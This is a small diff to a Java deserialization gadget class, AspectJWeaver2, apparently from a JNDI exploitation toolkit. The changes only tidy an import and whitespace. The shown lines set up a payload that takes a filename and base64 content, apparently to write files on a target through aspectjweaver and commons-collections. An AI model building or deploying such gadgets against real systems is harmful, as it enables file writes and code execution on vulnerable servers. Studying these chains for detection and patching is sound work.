@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.apache.commons.codec.binary.Base64;
@@ -20,16 +19,15 @@ import java.util.Map;
 
 /**
  * 使用 ConstantFactory + FactoryTransformer 替换 ConstantTransformer，避免，类似本项目中的 CC10
- *
  */
 
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
-public class AspectJWeaver2 implements ObjectPayload<Serializable>{
+public class AspectJWeaver2 implements ObjectPayload<Serializable> {
 
     @Override
     public Serializable getObject(String command) throws Exception {
-        
+
         int sep = command.lastIndexOf(';');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <filename>;<base64 Object>");
